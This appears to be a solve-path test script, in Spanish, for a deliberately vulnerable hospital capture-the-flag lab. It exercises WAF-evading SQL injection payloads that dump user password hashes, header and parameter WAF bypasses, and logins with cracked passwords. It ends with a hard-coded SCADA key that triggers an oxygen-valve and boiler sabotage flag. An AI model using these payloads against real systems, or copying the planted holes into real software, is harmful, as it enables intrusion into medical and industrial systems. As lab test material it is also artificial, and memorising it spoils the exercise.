import json
from app import create_app, db
from app.models import Patient, User, SystemConfig

app = create_app()
client = app.test_client()

def test_all():
    print("=== TEST 1: Búsqueda legítima de paciente ===")
    res = client.get('/api/patients/search?query=Valenzuela')
    assert res.status_code == 200
    data = res.get_json()
    print(f"Resultados encontrados: {data['count']}")
    assert data['count'] > 0

    print("\n=== TEST 2: Intento ingenuo de SQLi (' OR '1'='1) -> Debe ser BLOQUEADO por WAF ===")
    res = client.get('/api/patients/search?query=\' OR \'1\'=\'1')
    print(f"Status code WAF: {res.status_code}")
    assert res.status_code == 403
    data = res.get_json()
    print(f"WAF response: {data.get('error')}")
    assert data.get('waf_blocked') is True

    print("\n=== TEST 3: Intento ingenuo de UNION SELECT directo -> Debe ser BLOQUEADO por WAF ===")
    res = client.get("/api/patients/search?query=' UNION SELECT id, username, password_hash, full_name, role, department, null, null, null, null FROM users --")
    print(f"Status code WAF: {res.status_code}")
    assert res.status_code == 403
    data = res.get_json()
    print(f"WAF response: {data.get('error')}")
    assert data.get('waf_blocked') is True

    print("\n=== TEST 4: Evasión de WAF mediante comentarios SQL (/**/) ===")
    evasion_payload = "'/**/UNION/**/SELECT/**/id,username,password_hash,full_name,role,department,null,null,null,null/**/FROM/**/users/**/--"
    res = client.get(f"/api/patients/search?query={evasion_payload}")
    print(f"Status code Evasión: {res.status_code}")
    assert res.status_code == 200
    data = res.get_json()
    print(f"Filas totales recuperadas con evasión: {data['count']}")
    assert data['count'] == 153
    # Verificar que el usuario admin está en las respuestas
    admin_found = any(r['rut'] == 'admin' or r['first_name'] == 'admin' for r in data['results'])
    assert admin_found, "Usuario admin no encontrado en los resultados de UNION SELECT"
    print("-> Usuario 'admin' extraído exitosamente mediante evasión de WAF!")

    print("\n=== TEST 5: Bypass de WAF mediante Cabecera de Intranet (X-Hospital-Internal) ===")
    res = client.get(
        "/api/patients/search?query=' UNION SELECT id, username, password_hash, full_name, role, department, null, null, null, null FROM users --",
        headers={"X-Hospital-Internal": "true"}
    )
    print(f"Status code con Cabecera Intranet: {res.status_code}")
    assert res.status_code == 200
    data = res.get_json()
    print(f"Filas recuperadas con cabecera interna: {data['count']}")
    assert data['count'] == 153

    print("\n=== TEST 6: Bypass de WAF mediante parámetro ?internal_bypass=1 ===")
    res = client.get(
        "/api/patients/search?query=' UNION SELECT id, username, password_hash, full_name, role, department, null, null, null, null FROM users --&internal_bypass=1"
    )
    print(f"Status code con internal_bypass=1: {res.status_code}")
    assert res.status_code == 200

    print("\n=== TEST 7: Verificación de Login Seguro (Bypass 'admin' --' BLOQUEADO) ===")
    res = client.post('/api/auth/login', json={'username': "admin' --", 'password': 'cualquiercosa'})
    assert res.status_code == 401
    print("-> Bypass directo 'admin --' correctamente bloqueado (401 Unauthorized)")

    print("\n=== TEST 8: Login como Dr. Morales (doctor2026 / MD5 crackeado) ===")
    res = client.post('/api/auth/login', json={'username': 'dr_morales', 'password': 'doctor2026'})
    assert res.status_code == 200
    doc_data = res.get_json()
    doc_token = doc_data['token']
    assert doc_data['user']['role'] == 'doctor'
    print("-> Login exitoso como Dr. Morales!")

    print("\n=== TEST 9: Acceso a Ficha Confidencial Paciente #140 (Flag 1) por Dr. Morales ===")
    res = client.get('/api/patients/140', headers={'Authorization': f'Bearer {doc_token}'})
    assert res.status_code == 200
    p140 = res.get_json()
    assert 'confidential_notes' in p140
    assert "FLAG{h0sp1t4l_d4t4b4s3_l34k}" in p140['confidential_notes']
    assert p140['attending_doctor'] == "Dr. Claudio Morales (Medicina Interna y UCI)"
    print("-> Flag 1 verificada exitosamente en la ficha del paciente #140 por el Dr. Morales!")

    print("\n=== TEST 10: Intento de Sabotaje BMS por Dr. Morales (Debe fallar por Rol) ===")
    res = client.post(
        '/api/ot/actuators/override',
        headers={'Authorization': f'Bearer {doc_token}'},
        json={'valve_o2_bypass': True, 'boiler_overdrive': True, 'override_key': 'HSR-BMS-SECURE-OVERRIDE-KEY-994'}
    )
    assert res.status_code == 403
    print("-> Control de acceso verificado: Un médico no tiene permiso para alterar el BMS")

    print("\n=== TEST 11: Login como Ing. Valenzuela (biomedica2026 / MD5 crackeado) ===")
    res = client.post('/api/auth/login', json={'username': 'ing_valenzuela', 'password': 'biomedica2026'})
    assert res.status_code == 200
    eng_data = res.get_json()
    eng_token = eng_data['token']
    assert eng_data['user']['role'] == 'engineer'
    print("-> Login exitoso como Ing. Roberto Valenzuela!")

    print("\n=== TEST 12: Bloqueo de actuadores OT sin Clave de Sobreescritura SCADA ===")
    res = client.post(
        '/api/ot/actuators/override',
        headers={'Authorization': f'Bearer {eng_token}'},
        json={'valve_o2_bypass': True, 'boiler_overdrive': True}
    )
    assert res.status_code == 403
    ot_err = res.get_json()
    assert ot_err.get('requires_override_key') is True
    print("-> Verificado: BMS exige la clave de sobreescritura")

    print("\n=== TEST 13: Activación de Incendio OT con Clave Maestra SCADA (Flag 2) ===")
    res = client.post(
        '/api/ot/actuators/override',
        headers={'Authorization': f'Bearer {eng_token}'},
        json={
            'valve_o2_bypass': True,
            'boiler_overdrive': True,
            'override_key': 'HSR-BMS-SECURE-OVERRIDE-KEY-994'
        }
    )
    assert res.status_code == 200
    ot_res = res.get_json()
    assert ot_res.get('flag') == "FLAG{h0sp1t4l_s4b0t4g3}"
    print(f"-> Flag 2 obtenida exitosamente: {ot_res.get('flag')}")

    print("\n==========================================")
    print("[OK] TODOS LOS 13 TESTS DE CAMINO A PASARON EXITOSAMENTE")
    print("==========================================")

if __name__ == '__main__':
    test_all()
